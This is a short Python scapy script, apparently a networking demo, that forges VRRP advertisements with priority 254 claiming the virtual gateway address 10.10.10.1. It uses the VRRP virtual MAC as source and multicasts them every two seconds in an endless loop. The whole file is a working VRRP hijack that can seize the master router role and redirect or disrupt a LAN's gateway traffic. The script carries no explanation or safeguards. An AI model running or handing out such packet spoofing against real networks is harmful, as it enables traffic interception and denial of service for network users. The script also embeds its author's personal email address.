#!/usr/bin/python

__author__ = "Bassim Aly"
__EMAIL__ = "basim.alyy@gmail.com"

from scapy.layers.inet import *
from scapy.layers.vrrp import VRRP

vrrp_packet = Ether(src="00:00:5e:00:01:01", dst="01:00:5e:00:00:30") / IP(src="10.10.10.130", dst="224.0.0.18") / VRRP(
    priority=254, addrlist=["10.10.10.1"])
sendp(vrrp_packet, inter=2, loop=1)
